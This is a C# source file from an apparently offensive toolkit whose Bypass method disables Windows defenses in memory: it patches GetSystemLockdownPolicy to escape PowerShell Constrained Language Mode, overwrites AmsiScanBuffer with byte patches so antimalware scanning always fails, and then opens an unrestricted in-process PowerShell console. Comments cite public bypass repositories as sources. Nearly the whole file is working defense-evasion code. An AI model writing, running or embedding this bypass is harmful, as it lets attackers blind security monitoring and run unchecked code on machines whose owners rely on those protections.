using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using static NetRunners.Data.Delegates;

namespace NetRunnersClm
{
    public static class Command
    {
        //public static void Execute(string cmd)
        //{
        //    Runspace rs = RunspaceFactory.CreateRunspace();
        //    rs.Open();
        //    PowerShell ps = PowerShell.Create();
        //    ps.Runspace = rs;

        //    // run cmd
        //    ps.AddScript(cmd);
        //    ps.Invoke();
        //    rs.Close();
        //}

        // interactive CLM bypass source: https://github.com/calebstewart/bypass-clm/blob/master/bypass-clm/Program.cs
        public static void Bypass()
        {
            // Find a reference to the automation assembly
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            // Get a MethodInfo reference to the GetSystemLockdownPolicy method
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            // Retrieve a handle to the method
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            // This ensures the method is JIT compiled
            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            // Get a pointer to the compiled function
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            // Ensure we can write to the address
            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            // Before we start powershell, we nullify AmsiScanBuffer as well. This ensures AMSI doesn't plague
            // us in our new shell.
            var amsi = LoadLibraryA("amsi.dll");
            var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);

            // Stolen from https://github.com/rasta-mouse/AmsiScanBufferBypass
            // On x86, Windows uses __stdcall, which is callee cleanup, whereas 64-bit uses Microsoft x64 calling convention
            // which is caller cleanup. If we don't use the right one, we will get a stack alignment error.
            if (System.IntPtr.Size == 8)
            {
                // mov eax,E_INVALIDARG
                // ret
                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, AmsiScanBuffer, 6);
            }
            else
            {
                // mov eax,E_INVALIDARG
                // ret 18
                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
            }

            // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
                "-exec", "bypass", "-nop"
            });
        }
    }
}
